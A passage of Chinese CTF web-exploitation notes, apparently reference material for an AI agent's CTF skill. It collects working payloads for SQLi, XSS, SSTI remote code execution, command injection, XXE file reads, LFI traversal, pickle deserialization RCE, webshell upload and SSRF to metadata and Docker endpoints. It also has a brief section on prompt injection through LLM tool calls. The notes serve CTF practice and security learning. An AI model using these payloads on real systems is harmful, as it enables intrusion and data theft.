# CTF Web 实战笔记

从 `SKILL.md` 移出的长文利用笔记，让主 skill 专注于路由与首轮执行。

## 目录

- [侦察](#侦察)
- [SQL 注入速查](#sql-注入速查)
- [XSS 速查](#xss-速查)
- [借 JSONP 回调的 XSSI 外带](#借-jsonp-回调的-xssi-外带)
- [路径穿越 / LFI 速查](#路径穿越--lfi-速查)
- [JWT 速查](#jwt-速查)
- [SSTI 速查](#ssti-速查)
- [Python str.format() 属性遍历（PlaidCTF 2017）](#python-strformat-属性遍历plaidctf-2017)
- [SSRF 速查](#ssrf-速查)
- [命令注入速查](#命令注入速查)
- [XXE 速查](#xxe-速查)
- [PHP 类型混淆速查](#php-类型混淆速查)
- [PHP 文件包含 / LFI 速查](#php-文件包含--lfi-速查)
- [代码注入速查](#代码注入速查)
- [Java 反序列化](#java-反序列化)
- [Python Pickle 反序列化](#python-pickle-反序列化)
- [竞争条件（检查与使用之间）](#竞争条件检查与使用之间)
- [Node.js 速查](#nodejs-速查)
- [认证与访问控制速查](#认证与访问控制速查)
- [Apache CVE-2012-0053 HttpOnly Cookie 泄露](#apache-cve-2012-0053-httponly-cookie-泄露)
- [Apache mod_status 信息泄露](#apache-mod_status-信息泄露)
- [开放重定向链](#开放重定向链)
- [现代 Web CTF 模式（2025/2026）](#现代-web-ctf-模式20252026)
- [子域接管](#子域接管)
- [文件上传到 RCE](#文件上传到-rce)
- [多阶段链式模式](#多阶段链式模式)
- [Flask/Werkzeug 调试模式](#flaskwerkzeug-调试模式)
- [借助外部 DTD 绕过过滤的 XXE](#借助外部-dtd-绕过过滤的-xxe)
- [JSFuck 解码](#jsfuck-解码)
- [jQuery hashchange 触发的 DOM XSS（Crypto-Cat）](#jquery-hashchange-触发的-dom-xsscrypto-cat)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME 不匹配](#dom-clobbering--mime-不匹配)
- [通过缓存代理实现 HTTP 请求走私](#通过缓存代理实现-http-请求走私)
- [路径穿越：URL 编码斜杠绕过](#路径穿越url-编码斜杠绕过)
- [WeasyPrint SSRF 与文件读取（CVE-2024-28184）](#weasyprint-ssrf-与文件读取cve-2024-28184)
- [MongoDB 正则 / $where 盲注](#mongodb-正则--where-盲注)
- [Pongo2 / Go 模板注入](#pongo2--go-模板注入)
- [ZIP 上传配 PHP Webshell](#zip-上传配-php-webshell)
- [basename() 绕过读取隐藏文件](#basename-绕过读取隐藏文件)
- [自定义线性 MAC 伪造](#自定义线性-mac-伪造)
- [CSS/JS 付费墙绕过](#cssjs-付费墙绕过)
- [SSRF 到 Docker API RCE 链](#ssrf-到-docker-api-rce-链)
- [通过 xsi:type 的 Castor XML 反序列化（Atlas HTB）](#通过-xsitype-的-castor-xml-反序列化atlas-htb)
- [Apache ErrorDocument 表达式文件读取（Zero HTB）](#apache-errordocument-表达式文件读取zero-htb)
- [HTTP TRACE 方法绕过](#http-trace-方法绕过)
- [LLM/AI 聊天机器人越狱](#llmai-聊天机器人越狱)
- [管理机器人 javascript: URL 协议绕过](#管理机器人-javascript-url-协议绕过)
- [利用图片加载时序的 XS-Leak + GraphQL CSRF（HTB GrandMonty）](#利用图片加载时序的-xs-leak--graphql-csrfhtb-grandmonty)
- [React Server Components Flight 协议 RCE（Ehax 2026）](#react-server-components-flight-协议-rceehax-2026)
- [Unicode 大小写折叠 XSS 绕过（UNbreakable 2026）](#unicode-大小写折叠-xss-绕过unbreakable-2026)
- [CSS 字体字形 + 容器查询数据外带（UNbreakable 2026）](#css-字体字形--容器查询数据外带unbreakable-2026)
- [Hyperscript / Alpine.js CDN CSP 绕过（UNbreakable 2026）](#hyperscript--alpinejs-cdn-csp-绕过unbreakable-2026)
- [Solidity 瞬态存储清理碰撞（0.8.28-0.8.33）](#solidity-瞬态存储清理碰撞0828-0833)
- [Chrome Unicode URL 规范化绕过（RCTF 2017）](#chrome-unicode-url-规范化绕过rctf-2017)
- [通过 base 标签劫持绕过 CSP Nonce（BSidesSF 2026）](#通过-base-标签劫持绕过-csp-noncebsidessf-2026)
- [JA4/JA4H TLS 指纹匹配（BSidesSF 2026）](#ja4ja4h-tls-指纹匹配bsidessf-2026)
- [借泄露的 JS 密钥绕过客户端 HMAC（Codegate 2013）](#借泄露的-js-密钥绕过客户端-hmaccodegate-2013)
- [SQLi 关键字拆解绕过（SecuInside 2013）](#sqli-关键字拆解绕过secuinside-2013)
- [通过剥离 STOP 操作码串联 Pickle（VolgaCTF 2013）](#通过剥离-stop-操作码串联-picklevolgactf-2013)
- [XPath 盲注（BaltCTF 2013）](#xpath-盲注baltctf-2013)
- [SQLite 文件路径穿越绕过字符串相等（Codegate 2013）](#sqlite-文件路径穿越绕过字符串相等codegate-2013)
- [借过滤词扩展操纵 PHP 序列化长度（0CTF 2016）](#借过滤词扩展操纵-php-序列化长度0ctf-2016)
- [通过 link prefetch 绕过 CSP（Boston Key Party 2016）](#通过-link-prefetch-绕过-cspboston-key-party-2016)
- [通过 X-Forwarded-For 头做 XML 注入（Pwn2Win 2016）](#通过-x-forwarded-for-头做-xml-注入pwn2win-2016)
- [Base64 解码宽松性 + 参数覆盖绕过签名（BCTF 2016）](#base64-解码宽松性--参数覆盖绕过签名bctf-2016)
- [常见 flag 位置](#常见-flag-位置)

<a id="reconnaissance"></a>
## 侦察

- 看源码里的 HTML 注释，检查 JS/CSS 文件找内部 API
- 找 `.map` source map 文件
- 检查响应头里的自定义 X- 头和认证线索
- 常见路径：`/robots.txt`、`/sitemap.xml`、`/.well-known/`、`/admin`、`/api`、`/debug`、`/.git/`、`/.env`
- 搜 JS bundle：`grep -oE '"/api/[^"]+"'` 找隐藏端点
- 检查可绕过的客户端校验
- 对比 UI 发送的内容与 API 接受的内容（读 JS bundle 看所有字段）
- 检查返回 404 的静态资源——`favicon.ico`、`robots.txt` 可能即使报错也含数据：`strings favicon.ico | grep -i flag`
- Tor 隐藏服务：`feroxbuster -u 'http://target.onion/' -w wordlist.txt --proxy socks5h://127.0.0.1:9050 -t 10 -x .txt,.html,.bak`

<a id="sql-injection-quick-reference"></a>
## SQL 注入速查

**识别：** 发一个 `'`——报语法错说明有 SQLi

```sql
' OR '1'='1                    # Classic auth bypass
' OR 1=1--                     # Comment termination
username=\&password= OR 1=1--  # Backslash escape quote bypass
' UNION SELECT sql,2,3 FROM sqlite_master--  # SQLite schema
0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
```

WAF 绕过：XML 实体编码（`&#x55;NION`）、EXIF 元数据注入（`exiftool -Comment="' UNION SELECT..."`）、Shift-JIS `\u00a5`→`0x5c` 反斜杠、二维码 payload 注入、双关键字嵌套（`selselectect`）。全部技巧见 [sql-injection.md](sql-injection.md)。

MySQL 会话变量双值注入：同一连接内 `@var:=` 赋值会让后续查询返回不同值。PHP PCRE 回溯上限 WAF 绕过：100 万字符以上会让 `preg_match()` 返回 `false`，从而通过 `!false`。`information_schema.processlist` 竞争条件可从并发查询中泄露机密。见 [sql-injection.md](sql-injection.md)。

PHP preg_replace /e RCE 与 Prolog 注入见 [server-side-exec.md](server-side-exec.md)。通过 DNS 记录做 SQLi、SQLi 关键字拆解见 [server-side-exec-2.md](server-side-exec-2.md)。

<a id="xss-quick-reference"></a>
## XSS 速查

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

过滤绕过：hex `\x3cscript\x3e`、实体 `&#60;script&#62;`、大小写混写 `<ScRiPt>`、事件处理器。
- **XSS 点号过滤绕过：** 十进制 IP（`1551576387` = `92.123.45.67`）让 URL 里没有点号。JavaScript 方括号记法（`document["cookie"]`）取代点号属性访问。见 [client-side-advanced.md](client-side-advanced.md#借十进制-ip-与方括号记法绕过点号过滤33c3-ctf-2016)。
- **跨源 Cookie XSS：** 从一个子域用 `domain=.parent.tld` 设置 Cookie，注入在兄弟子域渲染的 XSS payload。见 [client-side-advanced.md](client-side-advanced.md#共享父域-cookie-注入导致的跨源-xss0ctf-2017)。
- **AngularJS 1.x 沙箱逃逸：** 用 `trim` 覆写 `String.prototype.charAt` 绕过 AngularJS 表达式沙箱，再用 `$eval` 执行任意 JS。见 [client-side.md](client-side.md#通过覆写-charattrim-逃逸-angularjs-1x-沙箱google-ctf-2017)。

DOMPurify 绕过、缓存投毒、CSPT、React 输入技巧见 [client-side.md](client-side.md)。

<a id="xssi-via-jsonp-callback-exfiltration"></a>
## 借 JSONP 回调的 XSSI 外带

JSONP 端点（`?callback=func`）把敏感数据包进函数调用。用带自定义 callback 的 `<script src>` 跨源加载即可外带。链条：SHA1 Cookie 反推 -> 调试端点 IDOR -> XSSI -> 云函数带外。见 [client-side-advanced.md](client-side-advanced.md#借-jsonp-回调的-xssi--云函数外带bsidessf-2026)。

<a id="path-traversal--lfi-quick-reference"></a>
## 路径穿越 / LFI 速查

```text
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**Windows 8.3 短文件名绕过：** `FILEFO~1.EXT` 短名可绕过检查长文件名的路径过滤器。见 [server-side-advanced-2.md](server-side-advanced-2.md#windows-83-短文件名绕过路径穿越tokyo-westerns-2016)。

**URL parse_url @ 绕过：** `http://valid@attacker.com/`——PHP `parse_url()` 把 `attacker.com` 当主机，从而绕过域名检查。见 [server-side-advanced-2.md](server-side-advanced-2.md#url-parse_url-的--符号绕过ekoparty-ctf-2016)。
- **SSRF 双 @ 解析差异：** `http://x:x@127.0.0.1:80@allowed.host/path`——`parse_url()` 看到 `allowed.host`，curl 连到 `127.0.0.1`。与单 @ 绕过不同。见 [server-side-advanced-2.md](server-side-advanced-2.md#parse_urlcurl-解析差异导致的-ssrf33c3-ctf-2016)。

**/dev/fd 符号链接绕过：** 当 `/proc` 被拉黑时，用 `/dev/fd/../environ`——`/dev/fd` 是指向 `/proc/self/fd` 的符号链接，`../` 即可到达 `/proc/self/`。见 [server-side-advanced.md](server-side-advanced.md#devfd-符号链接绕过-proc-过滤google-ctf-2017)。

**Python 坑：** `os.path.join('/app/public', '/etc/passwd')` 返回 `/etc/passwd`

<a id="jwt-quick-reference"></a>
## JWT 速查

1. `alg: none`——完全去掉签名
2. 算法混淆（RS256→HS256）——用公钥签名
3. 弱密钥——用 hashcat/flask-unsign 爆破
4. 密钥泄露——检查 `/api/getPublicKey`、`.env`、`/debug/config`
5. 余额重放——保存 JWT、消费、重放旧 JWT、退回商品获利
6. 未校验签名——改 payload，保留原签名
7. JWK 头注入——把攻击者公钥嵌进 token 头
8. JKU 头注入——指向攻击者控制的 JWKS URL
9. KID 路径穿越——`../../../dev/null` 得到空密钥，或在 KID 里做 SQL 注入

完整的 JWT/JWE 攻击与会话操纵见 [auth-jwt.md](auth-jwt.md)。

<a id="ssti-quick-reference"></a>
## SSTI 速查

**识别：** `{{7*7}}` 返回 `49`

```python
# Jinja2 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Go template
{{.ReadFile "/flag.txt"}}
# EJS
<%- global.process.mainModule.require('child_process').execSync('id') %>
# Jinja2 quote bypass (keyword args):
{{obj.__dict__.update(attr=value) or obj.name}}
```

**Mako SSTI（Python）：** `${__import__('os').popen('id').read()}`——无沙箱，`${}` 或 `<% %>` 里就是原生 Python。**Twig SSTI（PHP）：** `{{['id']|map('system')|join}}`——用 `{{7*'7'}}` 区分 Jinja2（Twig 重复字符串，Jinja2 返回 49）。见 [server-side.md](server-side.md#mako-ssti) 和 [server-side.md](server-side.md#twig-ssti)。

**引号过滤绕过：** 用 `__dict__.update(key=value)`——关键字参数不需要引号。见 [server-side.md](server-side.md#通过-__dict__update-绕过-ssti-引号过滤apoorvctf-2026)。

**ERB SSTI（Ruby/Sinatra）：** `<%= Sequel::DATABASES.first[:table].all %>` 通过全局 `Sequel::DATABASES` 数组绕过 ERBSandbox 的变量名限制。见 [server-side.md](server-side.md#erb-ssti--sequeldatabases-绕过bearcatctf-2026)。

<a id="python-strformat-attribute-traversal-plaidctf-2017"></a>
## Python str.format() 属性遍历（PlaidCTF 2017）

Python `str.format()` 支持点号属性遍历（`{0.attr.subattr}`）和方括号索引（`{0[key]}`）。当用户输入进入 `.format(obj)`，无需模板引擎即可泄露任意属性。与 SSTI 不同。见 [server-side.md](server-side.md#python-strformat-属性遍历plaidctf-2017)。

**Thymeleaf SpEL SSTI（Java/Spring）：** `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}`——标准 I/O 被 WAF 拦截时，通过 Spring 工具类读文件。在 distroless 容器（无 shell）里也能用。见 [server-side-exec.md](server-side-exec.md#thymeleaf-spel-ssti--spring-filecopyutils-绕过-wafapoorvctf-2026)。

<a id="ssrf-quick-reference"></a>
## SSRF 速查

```text
127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
127.0.0.1.nip.io, 2130706433, 0x7f000001
```

用于 TOCTOU 的 DNS rebinding：https://lock.cmpxchg8b.com/rebinder.html

**Host 头 SSRF：** 服务器用 `Host` 头拼接内部请求 URL（如 `http.Get("http://" + request.Host + "/validate")`）。把 Host 设为攻击者域名 → 校验请求打到攻击者服务器。见 [server-side.md](server-side.md#host-头-ssrfmireactf)。

**通过 SSRF 的 ElasticSearch Groovy RCE：** SSRF 到 9200 端口的内网 ES，通过 `script_fields` Groovy 脚本实现 RCE（5.0 之前）。见 [server-side-advanced-2.md](server-side-advanced-2.md#经-ssrf-打-elasticsearch-groovy-script_fields-的-rcevolgactf-2017)。

<a id="command-injection-quick-reference"></a>
## 命令注入速查

```bash
; id          | id          `id`          $(id)
%0aid         # Newline     127.0.0.1%0acat /flag
```

cat/head 被拦时：`sed -n p flag.txt`、`awk '{print}'`、`tac flag.txt`

**Bash 花括号展开（无空格注入）：** `{ls,-la,..}` 展开为 `ls -la ..`，不含字面空格。见 [server-side-exec-2.md](server-side-exec-2.md#bash-花括号展开实现无空格命令注入insomnihack-2016)。

**Git CLI 换行注入：** URL 路径里的 `%0a` 可逃出那些只过滤 `;|&<>` 的 backtick/system() shell 调用。见 [server-side-2.md](server-side-2.md#经-url-路径的-git-cli-换行注入bsidessf-2026)。

<a id="xxe-quick-reference"></a>
## XXE 速查

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

PHP filter：`<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">`

**DOCX 上传中的 XXE：** DOCX 就是 ZIP+XML；在压缩包内 `[Content_Types].xml` 里注入 XXE。见 [server-side-2.md](server-side-2.md#经-docxoffice-xml-上传的-xxeschool-ctf-2016)。

<a id="php-type-juggling-quick-reference"></a>
## PHP 类型混淆速查

松散 `==` 会做类型转换：`0 == "string"` 为 `true`，`"0e123" == "0e456"` 为 `true`（魔法哈希）。发送 JSON 整数 `0` 可绕过字符串密码校验。`strcmp([], "str")` 返回 `NULL`，能通过 `!strcmp()`。防御请用 `===`。

对比表与利用 payload 见 [server-side.md](server-side.md#php-类型混淆)。

<a id="php-file-inclusion--lfi-quick-reference"></a>
## PHP 文件包含 / LFI 速查

`php://filter/convert.base64-encode/resource=config` 可在不执行的情况下泄露 PHP 源码。常见 LFI 目标：`/etc/passwd`、`/proc/self/environ`、应用配置文件。PHP < 5.3.4 可用空字节（`%00`）截断 `.php` 后缀。

过滤器链与 RCE 技巧见 [server-side.md](server-side.md#php-文件包含--phpfilter)。

<a id="code-injection-quick-reference"></a>
## 代码注入速查

**Ruby `instance_eval`：** 闭合字符串 + 注释：`VALID');INJECTED_CODE#`
**Perl `open()`：** 两参数 open 允许管道：`|command|`
**JS `eval` 黑名单绕过：** `row['con'+'structor']['con'+'structor']('return this')()`
**PHP 反序列化：** 在 Cookie 里构造序列化对象 → LFI/RCE
**LaTeX 注入：** `\input{|"cat /flag.txt"}`——PDF 生成服务里通过管道语法执行 shell 命令。不打 shell 时用 `\@@input"/etc/passwd"` 读文件。
- **LaTeX 受限 write18 绕过：** 当 `write18` 受限时，`mpost -ini "-tex=bash -c (cmd)" file.mp` 借助 mpost 的白名单状态执行任意命令。`${IFS}` 用来代替空格。见 [server-side-advanced-2.md](server-side-advanced-2.md#latex-借-mpost-绕过受限-write18-实现-rce33c3-ctf-2016)。

**PHP 反引号 eval（字符数限制）：** `` echo`cat *`; ``——PHP 反引号等于 `shell_exec()`，最少 8 个字符就能 RCE。用 `` `$_GET[0]`; `` 把 payload 挪到 URL 参数。见 [server-side-exec.md](server-side-exec.md#字符长度限制下的-php-反引号执行easyctf-2017)。
**PHP assert() 注入：** `assert("strpos('$input', '..') === false")`——注入 `') || system('cmd');//` 实现 RCE（PHP < 7.2）。见 [server-side-exec.md](server-side-exec.md#php-assert-字符串求值注入csaw-ctf-2016)。
**Common Lisp `read` 注入：** `#.(run-shell-command "cat /flag")`——reader macro 在解析时求值。见 [server-side-exec-2.md](server-side-exec-2.md#common-lisp-经-reader-macro-注入insomnihack-2016)。
**Ruby ObjectSpace 扫描：** `ObjectSpace.each_object(String)` 可倾出内存里所有字符串，包括 flag。见 [server-side-exec.md](server-side-exec.md#ruby-objectspace-内存扫描提取-flagtokyo-westerns-2016)。

完整 payload 与绕过技巧见 [server-side-exec.md](server-side-exec.md)。

<a id="java-deserialization"></a>
## Java 反序列化

序列化的 Java 对象（`rO0AB` / `aced0005`）+ ysoserial gadget 链 → 经 `ObjectInputStream.readObject()` 实现 RCE。先试 `CommonsCollections1-7`；盲测用 `URLDNS`。见 [server-side-deser.md](server-side-deser.md#java-反序列化ysoserial)。

<a id="python-pickle-deserialization"></a>
## Python Pickle 反序列化

`pickle.loads()` 会调用 `__reduce__()` → `(os.system, ('cmd',))` 即刻 RCE。`yaml.load()`、`torch.load()`、`joblib.load()` 同理。见 [server-side-deser.md](server-side-deser.md#python-pickle-反序列化)。

<a id="race-conditions-time-of-check-to-time-of-use"></a>
## 竞争条件（检查与使用之间）

并发请求可绕过"先检查后执行"的模式（余额、优惠券、注册）。同时发 50 个请求——它们都看到修改前的状态。见 [server-side-deser.md](server-side-deser.md#条件竞争time-of-check-to-time-of-use)。

<a id="nodejs-quick-reference"></a>
## Node.js 速查

**原型污染：** `{"__proto__": {"isAdmin": true}}` 或 flatnest 循环引用绕过
**VM 逃逸：** `this.constructor.constructor("return process")()` → RCE
**完整链：** 污染 → 在 Happy-DOM 中启用 JS eval → VM 逃逸 → RCE

**原型污染绕过权限：** 在 JSON 端点发 `{"__proto__":{"isAdmin":true}}` 会污染 `Object.prototype`。即使漏洞看起来是别的问题，也始终试一下 `__proto__` 注入。

详细利用见 [node-and-prototype.md](node-and-prototype.md)。

<a id="auth--access-control-quick-reference"></a>
## 认证与访问控制速查

- Cookie 操纵：`role=admin`、`isAdmin=true`
- 公开管理登录 Cookie 播种：检查 `/admin/login` 是否下发可复用的管理员会话 Cookie
- Host 头绕过：`Host: 127.0.0.1`
- 隐藏端点：在 JS bundle 里搜 `/api/internal/`、`/api/admin/`；带认证 Cookie 去爆破 `/internal/*` 这类非 `/api` 路由
- 客户端门禁：`window.overrideAccess = true`，或直接调 API
- 密码推断：资料数据 + 结构化 ID 格式 → 爆破
- 弱签名：检查是否只校验哈希的前 N 个字符
- 仿射密码 OTP：只有 312 种可能（`12 mults × 26 adds`），几秒内可全爆
- TOTP srand(time()) 弱点：同步服务器时钟即可预测验证码。见 [auth-and-access.md](auth-and-access.md#利用-php-srandtime-种子弱点恢复-totptum-ctf-2016)
- Express.js `%2F` 中间件绕过、WIP 端点 IDOR、git 历史凭据泄露
- CI/CD 变量窃取、身份提供方 API 接管（绕 MFA：`not_configured_action: skip`）
- SAML SSO 自动化、Guacamole 参数提取、登录页投毒、TeamCity REST API RCE

<a id="modern-web-ctf-patterns-20252026"></a>
## 现代 Web CTF 模式（2025/2026）

这些是近期 CTF 中反复出现、如果只依赖旧笔记很容易漏掉的现代 Web 模式。

<a id="oauthoidc-email-canonicalization-and-subaddressing"></a>
### OAuth/OIDC 邮箱规范化与子地址

常见错误：应用把 `alice+debug@example.com` 当作不同的登录身份，但下游身份提供方或数据库在规范化后把它视为同一账号。

**要查：**
- `email` 是否用 `lower()`、`trim()` 或 `replace("+", "")` 比较
- 流程是否忽略 `preferred_username`、`sub` 或 `oid`
- 提供方特有的规范化，例如 Gmail 风格的加号别名

**快速测试：**
```bash
alice@example.com
alice+ctf@example.com
ALICE+ctf@example.com
alice%2Bctf@example.com
```

**利用模式：** 创建第二个别名，触发密码重置或登录，然后验证应用是按原始 email 字符串认证，还是按不可变的 subject claim 认证。

**检查：** 对比 `email`、`sub`、`oid`、`preferred_username` 以及 `azp`/`aud` claim；确认服务端是否同时记录原始值与规范化值。

<a id="webauthn-challenge-fixation-and-replay"></a>
### WebAuthn challenge 固定与重放

现代应用常常只校验 `challenge` 是否存在，却从不把它绑定到当前会话、源或注册请求。

**模式：** 服务端把 challenge 存进会话，之后只要密码学签名有效，就接受来自另一流程的、之前观察到的 challenge。前端还可能在 `navigator.credentials.get()` 之后允许 Cookie/会话交换。

**检查：**
- `rpId` 与 `origin` 必须匹配当前页面
- challenge 应绑定 nonce 且一次性
- `userHandle` 或 `allowCredentials` 不应跨会话被接受

<a id="browser-origin-confusion-via-windowopen-postmessage-and-opener"></a>
### 通过 `window.open`、`postMessage`、`opener` 的浏览器源混淆

近期 CTF 常常利用那些信任子窗口、却不强制严格源校验的应用。

```javascript
const w = window.open('/oauth', '_blank');
window.addEventListener('message', e => {
  if (e.data.token) localStorage.setItem('token', e.data.token);
});
```

**模式：** 如果应用接受 `e.data` 却不校验 `event.origin` 和 `event.source`，恶意弹窗就能伪造 token 并写入 local/session storage。适当使用 `noopener`、`noreferrer` 和 `opener = null`。

**检查清单：** 校验 `event.origin === expectedOrigin`，把密码学 nonce/challenge 绑定到具体流程，优先用 PKCE 而不是把原始 token 放进 URL hash。

<a id="llm--ai-tool-call-prompt-injection"></a>
### LLM / AI 工具调用提示注入

危险的不只是模型被诱导打印机密文本，更在于它被允许在错误的上下文中调用特权工具。

**红旗信号：**
- 工具选择策略是 `auto`，没有策略门禁
- 工具描述暴露机密或内部元数据
- 不可信文档未经净化就被插入模型上下文

**缓解：** 在策略层校验工具调用，要求参数白名单，对敏感操作强制用户显式确认。

<a id="ssrf-parser-confusion-with-hostname-normalization"></a>
### 主机名规范化引发的 SSRF 解析器混淆

经典 SSRF 依然有效，但很多现代工具栈在 authority 或主机规范化上不一致。

```text
http://localhost@127.0.0.1
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://0
http://0x7f.0.0.1
http://[::1]
http://localhost.localdomain
```

**为什么重要：** `urllib.parse`、`curl`、Node 的 `URL` 以及各后端框架对"主机是 `localhost`、`127.0.0.1` 还是某个回环别名"可能各有判断。WAF 常常拦掉明显的 IP，却放行一个解析到本地服务的主机名。

<a id="graphql-aliasing-and-nested-query-confusion"></a>
### GraphQL 别名与嵌套查询混淆

GraphQL 不是什么魔法：问题通常出在别名冲突、嵌套查询合并，或变异操作构造完成后缺少授权绑定。

**红旗信号：**
- `alias` 名与已有字段冲突
- 批量查询共享同一个认证上下文，却不共享同一个策略作用域
- 自定义指令或动态字段被混进同一个 payload

**快速验证：** 用 `alias` 和嵌套字段把同一个对象在不同名字下重复取出，看单个请求是否给了应用超出预期的数据。

<a id="oauthoidc-redirect_uri-and-state-reuse"></a>
### OAuth/OIDC 的 `redirect_uri` 与 `state` 复用

很多近期 SSO 题目本质上是回跳混淆缺陷。

**典型缺陷：** `state` 或 `nonce` 存在，却没绑定到具体的 `client_id`、浏览器会话或 `redirect_uri`；后端跨不同租户或子域接受回调。

**检查清单：** 对 `client_id`、`redirect_uri`、`state`、`nonce` 做精确匹配校验；拒绝重复使用的 state；强制执行精确的 host/path 检查，而不是后缀/前缀匹配。

<a id="websocket-and-sse-auth-confusion"></a>
### WebSocket 与 SSE 认证混淆

应用有时在握手时校验认证，却从不在每条消息上重新检查会话。

**模式：** 角色变更或登出后，WS/SSE 流仍接受旧 token 或未经校验的事件 payload。用 `curl -N` 和原始 socket 客户端验证服务器是否在整个流上重新校验会话状态。

<a id="cookie-boundary-issues-samesite-partitioning-and-cross-subdomain-leakage"></a>
### Cookie 边界问题：SameSite、分区与跨子域泄露

很多 Web 题目把一个基础的信任边界缺陷藏在 Cookie 策略细节后面。

**检查：**
- `Set-Cookie` 缺少 `SameSite`，或 `Domain=` 过宽
- 兄弟子域意外共享认证 Cookie
- 父域上用户可控的页面读取了本属于另一个应用的 Cookie

<a id="cache-poisoning-via-etag-range-and-vary"></a>
### 通过 ETag、Range 与 `Vary` 的缓存投毒

缓存层常常是隐藏的信任边界。

**模式：** 响应随请求头变化，但服务器没把这些头写进 `Vary`；构造的 `If-None-Match` 或部分 `Range` 请求后返回过期缓存；CDN 对 `Host` 或 `X-Forwarded-Host` 的剥离/重写不一致。

<a id="blob--file--data-url-exfiltration-and-renderer-confusion"></a>
### Blob / File / data: URL 外带与渲染器混淆

浏览器会从 `blob:`、`data:`、`file:` URL 拉取活动内容，很多应用错误地信任这些上下文。

**检查清单：** 检查 iframe、worker 和嵌套窗口中的 `blob:` 与 `data:` 流程；找 `URL.createObjectURL` 流程或未强制严格 `origin`/`source` 校验的同源处理器；确认用户可控的 MIME 类型是否把文本变成活动脚本。

<a id="ssrf--internal-service-pivot-via-localhost-and-metadata-endpoints"></a>
### SSRF + 经 localhost 与元数据端点转向内部服务

现代 CTF 任务常把 SSRF 与本地服务发现结合起来。

```text
http://169.254.169.254/
http://metadata.google.internal/
http://localhost:3000/
http://host.docker.internal/
http://127.0.0.1:2375/
http://127.0.0.1:9200/
http://127.0.0.1:6379/
```

**为什么重要：** 很多题目应用在回环上暴露内部管理服务或调试端口；元数据端点常常泄露实例元数据或利用链的下一阶段。

<a id="nextjs--react-edge-rendering-and-rsc-trust-boundary-mistakes"></a>
### Next.js / React 边缘渲染与 RSC 信任边界错误

框架漏洞往往只是给老问题套了新壳：把用户可控状态传入可信的服务端渲染路径。

**迹象：** 服务端组件或 flight 数据被序列化进客户端；请求头或 Cookie 未经净化就被当作 props；路由参数被反射进可信 HTML 或组件树。

**快速测试：** 检查 `RSC`/`Flight` 头、服务端渲染路由中的请求 Cookie，以及应用是否信任服务端生成的、未经来源或授权策略校验的自定义响应。

<a id="open-redirect-login-poisoning-and-callback-confusion-with-multi-tenant-sso"></a>
### 开放重定向、登录投毒与多租户 SSO 的回跳混淆

并非所有认证漏洞都是 JWT 伪造。很多只是回跳路径混淆。

**模式：** 登录页接受攻击者控制的重定向目标，然后用重定向后的用户上下文解析已认证账号；或应用只比较重定向 URL 的后缀/前缀，而不是完整规范值。

**检查清单：** 对比回调参数，而不只是重定向 URL；检查后端在信任前是否把回调状态绑定到具体租户或用户；测试通配子域和多租户主机名。

---

<a id="apache-cve-2012-0053-httponly-cookie-leak"></a>
## Apache CVE-2012-0053 HttpOnly Cookie 泄露

发送超大 `Cookie` 头触发 400 Bad Request；Apache 的错误页会回显 Cookie 值，泄露 HttpOnly Cookie。见 [cves.md](cves.md#cve-2012-0053apache-借-400-bad-request-泄露-httponly-cookierc3-ctf-2016)。

<a id="apache-mod_status-information-disclosure"></a>
## Apache mod_status 信息泄露

`/server-status` 端点会暴露活跃 URL、客户端 IP 和会话数据。可用于发现管理端点和伪造会话。见 [auth-and-access.md](auth-and-access.md#apache-mod_status-信息泄露--会话伪造29c3-ctf-2012)。

<a id="open-redirect-chains"></a>
## 开放重定向链

把开放重定向（`?redirect=`、`?next=`、`?url=`）与 OAuth 流程串联以窃取 token。用 `@`、`%00`、`//`、`\`、CRLF 绕过校验。见 [auth-and-access.md](auth-and-access.md#开放重定向链)。

<a id="subdomain-takeover"></a>
## 子域接管

悬空 CNAME → 在外部服务上认领资源（GitHub Pages、S3、Heroku）。用 `subfinder` + `httpx` 枚举并核对指纹。见 [auth-and-access.md](auth-and-access.md#子域接管)。

访问控制绕过见 [auth-and-access.md](auth-and-access.md)，JWT/JWE 攻击见 [auth-jwt.md](auth-jwt.md)，OAuth/SAML/CI-CD/基础设施认证见 [auth-infra.md](auth-infra.md)。

<a id="file-upload-to-rce"></a>
## 文件上传到 RCE

- `.htaccess` 上传：`AddType application/x-httpd-php .lol` + webshell
- Gogs 符号链接：用 `core.sshCommand` 覆写 `.git/config` 实现 RCE
- Python `.so` 劫持：写入恶意共享对象 + 删除 `.pyc` 强制重新导入
- ZipSlip：zip 里的符号链接用于读文件，路径穿越用于写文件
- 日志投毒：User-Agent 里放 PHP payload + 路径穿越包含日志
- PNG/PHP 多语言 + 双扩展名：在 IEND chunk 后接 `<?php` 的合法 PNG，以 `.png.php` 上传；`disable_functions` 拦截 exec 时，用 `scandir('/')` + `file_get_contents()` 取 flag。见 [server-side-exec-2.md](server-side-exec-2.md#pngphp-多语言上传--双扩展名--绕过-disable_functionsmetactf-flash-2026)。

详细步骤见 [server-side-exec.md](server-side-exec.md) 和 [server-side-exec-2.md](server-side-exec-2.md)。

<a id="multi-stage-chain-patterns"></a>
## 多阶段链式模式

**0xClinic 链：** 密码推断 → 路径穿越 + ReDoS oracle（从 `/proc/1/environ` 泄露机密）→ CRLF 注入（CSP 绕过 + 缓存投毒 + XSS）→ urllib 协议绕过（SSRF）→ 经路径穿越写入 `.so` → RCE

**关键的串联思路：**
- 路径穿越 + 任意文件读取原语 → 泄露 `/proc/*/environ`、`/proc/*/cmdline`
- 头中的 CRLF → 一次拿下 CSP 绕过 + 缓存投毒 + XSS
- Python 里的任意文件写 → `.so` 劫持或 `.pyc` 覆写实现 RCE
- 响应体被转小写 → 用 hex 转义（`\x3c` 表示 `<`）

<a id="flaskwerkzeug-debug-mode"></a>
